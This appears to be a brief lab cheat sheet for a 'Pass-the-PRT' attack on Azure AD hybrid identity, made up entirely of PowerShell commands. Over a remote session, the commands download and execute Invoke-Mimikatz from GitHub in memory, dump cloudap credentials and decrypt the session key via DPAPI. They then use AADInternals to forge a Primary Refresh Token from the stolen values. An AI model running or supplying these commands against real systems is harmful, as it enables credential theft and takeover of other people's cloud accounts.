### Hybrid Identity

### Pass-the-PRT attack
```
Invoke-Command -
Session $infradminsrv -ScriptBlock{iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")}
Invoke-Command -
Session $infradminsrv -ScriptBlock{Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'}
Invoke-Command -
Session $infradminsrv -ScriptBlock{Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:AQAAAA… /unprotect"'}

From Student Host
Import-Module
C:\AzAD\Tools\AADInternals\AADInternals.psd1
$PRTOfMBarron = 'MC5BWEFBS2N0UUx…'
while($PRTOfMBarron.Length % 4) {$PRTOfMBarron += "="}
$PRT =[text.encoding]::UTF8.GetString([convert]::FromBase64String($PRTOfMBarron))
$ClearKey = "1054caa8a059f111ec521373d35d8a2f8…"
$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
```
